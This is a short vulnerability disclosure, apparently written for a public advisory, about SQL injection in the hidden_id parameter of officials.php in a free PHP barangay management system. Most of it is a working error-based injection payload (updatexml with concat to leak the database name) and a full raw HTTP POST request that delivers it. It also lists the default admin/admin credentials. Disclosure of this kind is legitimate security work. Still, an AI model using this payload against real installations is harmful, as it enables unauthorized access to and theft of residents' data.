# Barangay Management System v1.0 by itsourcecode.com has SQL injection

The decompression password for the source file is itsourcecode.

Login account: admin/admin (Super Admin account)

vendors: https://itsourcecode.com/free-projects/php-project/barangay-management-system-project-in-php-with-source-code/

Vulnerability File: /bmis/pages/officials/officials.php

Vulnerability location: /bmis/pages/officials/officials.php,hidden_id

[+] Payload: hidden_id=4' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> hidden_id


```sql
POST /bmis/pages/officials/officials.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/bmis/pages/officials/officials.php
Cookie: sessions=aj0k5o11d743ingah9kp1b0ejntrqer6; PHPSESSID=fbu82ocu8kd37b5b20uqq71a35; _ga=GA1.1.1382961971.1655097107; _gid=GA1.1.804632123.1655097107
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 261

hidden_id=4' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&txt_edit_cname=Reymar+Medes&txt_edit_contact=091234567890&txt_edit_address=Brgy.+Tan-awan.+Kabankalan+City&txt_edit_sterm=2018-05-22&txt_edit_eterm=2022-05-22&btn_save=Save&table_length=10
```

![image](https://user-images.githubusercontent.com/95555005/173292085-975c4ab3-cf90-456d-82a4-81fce93b256f.png)
